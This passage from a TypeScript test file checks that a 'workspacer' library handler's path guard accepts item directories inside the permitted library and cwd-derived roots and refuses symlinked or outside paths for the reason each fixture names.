      return real === rr || real.startsWith(rr.replace(/[/\\]+$/, '') + path.sep);
    };
    const globalStore = path.join(configDir, 'library');
    if (!under(globalStore) && !under(canonicalCwd)) return 'outside-item-roots';
    // LEXICAL, matching the gate's own deliberate choice: the two cwd-derived
    // directories are compared as written, never resolved.
    for (const dir of [
      path.join(canonicalCwd, '.workspacer', 'library'),
      path.join(canonicalCwd, '.claude'),
    ]) {
      if (real === dir || real.startsWith(dir + path.sep)) return '';
    }
    return under(globalStore) ? '' : 'outside-item-dirs';
  };

  for (const c of cases) {
    if (c.needsSymlinks && !CAN_SYMLINK) {
      // Filed as a SKIP with its reason rather than dropped: enumerated stays
      // equal to the fixture's length on every host, so the ratchet below still
      // catches a corpus that shrank even where half of it cannot run.
      sweep.skip('needsSymlinks');
      it.skip(c.name, () => {});
      continue;
    }
    it(c.name, () => {
      const sandbox = mkTmp('wks-itemdir-');
      const home = path.join(sandbox, 'home');
      const configDir = path.join(sandbox, 'config', 'workspacer');
      for (const d of [home, path.join(sandbox, 'outside'), path.join(configDir, 'library')]) {
        fs.mkdirSync(d, { recursive: true });
      }
      process.env.HOME = home;
      process.env.USERPROFILE = home;
      getConfigDirMock.mockImplementation(() => configDir);

      for (const d of c.tree?.dirs ?? []) fs.mkdirSync(path.join(sandbox, d), { recursive: true });
      for (const [rel, body] of Object.entries(c.tree?.files ?? {})) {
        const full = path.join(sandbox, rel);
        fs.mkdirSync(path.dirname(full), { recursive: true });
        fs.writeFileSync(full, body, 'utf-8');
      }
      for (const [rel, dest] of Object.entries(c.tree?.symlinks ?? {})) {
        const full = path.join(sandbox, rel);
        fs.mkdirSync(path.dirname(full), { recursive: true });
        fs.symlinkSync(path.join(sandbox, dest), full);
      }

      // The gate lives inside the handler's closure, so it is reached the way a
      // bus caller reaches it: register, call, take the guard the handler built.
      const cwd = path.join(sandbox, c.cwd);
      call('library.list', { cwd });
      const guard = libraryMock.list.mock.calls[0]![1] as (p: string) => string | null;
      const canonicalCwd = libraryMock.list.mock.calls[0]![0] as string;
      const item = path.join(sandbox, c.item);
      const got = guard(item);
      sweep.ran(c.expect);

      if (c.expect === 'accept') {
        expect(got, `${item} must be accepted — ${c.why}`).toBe(path.join(sandbox, c.resolvesTo!));
        return;
      }
      expect(got, `${item} must be refused — ${c.why}`).toBeNull();
      // THE RIGHT REASON: a bare refusal is satisfied by a gate that refuses
      // everything, and the two halves are different guards.
      expect(
        refusalReason(item, canonicalCwd, configDir),
        `refused, but not by the half the fixture names — ${c.why}`,
      ).toBe(c.refusedBy);
    });
  }

  itSweptTheWholeCorpus(sweep, 'the libraryItemDirs corpus sweep', cases.length, {
    allow: wantAllow,
    deny: wantDeny,
  });
});
